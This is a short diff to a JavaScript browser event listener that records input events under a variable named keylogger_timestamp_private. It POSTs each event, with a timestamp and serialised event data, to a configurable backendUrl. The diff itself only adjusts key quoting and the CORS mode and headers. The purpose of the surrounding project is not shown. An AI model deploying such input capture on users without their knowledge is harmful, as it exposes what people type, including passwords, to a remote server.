@@ -14,9 +14,9 @@ function addSpecificEventListener(event) {
     // debugger
     keylogger_timestamp_private = new Date();
     const inputEvent = {
-      eventType: event,
-      timestamp: keylogger_timestamp_private,
-      data: JSON.stringify(event_data),
+      "eventType": event,
+      "timestamp": keylogger_timestamp_private,
+      "data": JSON.stringify(event_data),
       // data: JSON.stringify(e),
       // data: e,
     };
@@ -24,8 +24,9 @@ function addSpecificEventListener(event) {
     // console.log('payload:', JSON.stringify(inputEvent))
     fetch(`${backendUrl}`, {
       method: "POST",
-      mode: "no-cors",
-      // headers: { "Content-Type": "application/json" },
+      mode: "cors",
+      // mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
       // json: {browserEvent: inputEvent}
       // body: inputEvent,
       // body: "hello world",
